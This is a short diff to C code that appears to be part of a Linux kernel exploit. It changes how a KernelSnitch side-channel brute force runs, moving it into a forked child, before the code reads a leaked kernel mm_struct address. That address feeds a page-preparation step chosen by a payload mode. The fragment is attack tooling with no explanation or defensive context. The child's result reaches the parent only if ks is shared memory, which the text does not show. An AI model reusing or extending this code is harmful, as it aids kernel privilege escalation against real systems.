@@ -1119,8 +1119,13 @@ uintptr_t prepare_kernel_page(int payload_mode) {
     return 0;
   }
 
-  kernelsnitch_bruteforce(ks);
-  uintptr_t leaked = ks->mm_struct;
+pid_t brute_child = fork();
+if (brute_child == 0) {
+    kernelsnitch_bruteforce(ks);
+    _exit(0);
+}
+SYSCHK(waitpid(brute_child, NULL, 0));
+uintptr_t leaked = ks->mm_struct;
   if (leaked == (uintptr_t)-1) {
     pr_warning("KernelSnitch mm_struct leak failed\n");
 #if defined(APP_PHYS_VIRTUAL_BASE_ORACLE) && APP_PHYS_VIRTUAL_BASE_ORACLE
